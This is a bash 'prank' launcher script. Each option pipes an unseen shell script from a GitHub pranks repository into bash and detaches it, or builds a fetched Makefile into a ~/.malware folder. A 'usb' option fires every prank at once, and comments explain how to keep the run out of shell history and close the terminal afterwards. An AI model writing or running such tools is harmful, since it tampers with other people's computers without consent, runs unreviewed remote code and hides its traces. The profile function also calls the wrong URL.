#!/bin/bash

# Menu for selecting which scripts to run

# Note: to execute this script, run "set +o history" to prevent menu.sh from being saved to history
# Then launch menu.sh with a space appended to it to prevent it from being saved to readline

# See which terminals exist on the user's machine
if command -v "gnome-terminal" >/dev/null; then
	src_launch="gnome-terminal --"
elif command -v "konsole" >/dev/null; then
	src_launch="konsole -e"
else
	src_launch=""
fi;

# Functions
wallpaper() {
	bash <(curl -s "$wallpaper") & disown
}

profile() {
	bash <(curl -s "$wallpaper") & disown
}

parrot() {
	bash <(curl -s "$parrot") & disown
}

sandstorm() {
	bash <(curl -s "$sandstorm") & disown
}

# Lockout gets opened in a new window instead of replacing the current terminal like before
lockout() {
	if [ "$src_launch" ] ; then
		local temp_rc=.lockoutrc
		cat <(curl -s $lockout) > $temp_rc
		$src_launch bash --rcfile $temp_rc -i && rm $temp_rc & disown
	else
		printf "wat da hell is this distro bro\n" # if mainstream terminals don't exist
	fi
}

flashbang() {
	bash <(curl -s "$flashbang") & disown
}

matrix() {
	curl -s -L $matrix -o Makefile && make && make install && rm Makefile && 
		$src_launch bash -c "/home/"$USER"/.malware/ascii_matrix -m1 grey; exec bash"
	printf "Done! Type 'matrix' in a new terminal to launch!\n"
}

# URLs
wallpaper="https://raw.githubusercontent.com/heixier/pranks/refs/heads/main/wallpaper/change_bg.sh"
profile="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/face/change_pic.sh"
parrot="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/parrot/parrot.sh"
lockout="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/lockout/lockout.sh"
flashbang="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/flashbang/flashbang.sh"
matrix="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/matrix/Makefile"
sandstorm="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/audio/bg_play.sh"

# Get all the options and stuff then runs them detached because parallel processing wooho
for opt in "$@"
do
	case "$opt" in
		"bg" | "wallpaper")
			wallpaper
			;;

		"profile" | "icon" | face)
			profile
			;;

		"parrot")
			parrot
			;;

		"lockout" | "trap") 
			lockout
			;;

		"flash" | "flashbang")
			flashbang
			;;

		"matrix" | "neo")
			matrix
			;;
		"darude" | "sandstorm")
			sandstorm
			;;

		"usb")
			matrix
			lockout
			parrot
			flashbang
			profile
			wallpaper
			;;
		*)
			;;
	esac
done

# Remember to append "&& exit"
# e.g bash menu.sh && exit
